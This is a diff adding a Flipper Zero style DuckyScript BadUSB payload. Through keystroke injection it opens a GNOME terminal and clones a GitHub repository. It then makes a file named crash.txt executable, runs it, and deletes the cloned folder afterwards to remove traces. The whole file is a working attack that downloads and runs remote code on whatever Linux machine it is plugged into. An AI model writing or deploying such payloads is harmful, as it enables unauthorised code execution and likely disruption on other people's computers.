@@ -1,0 +1,29 @@
+DELAY 1000
+ALT F2
+DELAY 500
+STRING gnome-terminal
+ENTER
+DELAY 1000
+STRING git clone https://github.com/SnowyNate/flipperzeroproject.git
+ENTER
+DELAY 1500
+STRING cd flipperzeroproject
+ENTER
+DELAY 300
+STRING chmod +x crash.txt
+ENTER
+DELAY 300
+STRING ./crash.txt
+ENTER
+DELAY 25000
+ALT F4
+DELAY 300
+ALT F2
+DELAY 500
+STRING gnome-terminal
+ENTER
+DELAY 1000
+STRING rm flipperzeroproject/ -f -r
+ENTER
+DELAY 300
+ALT F4
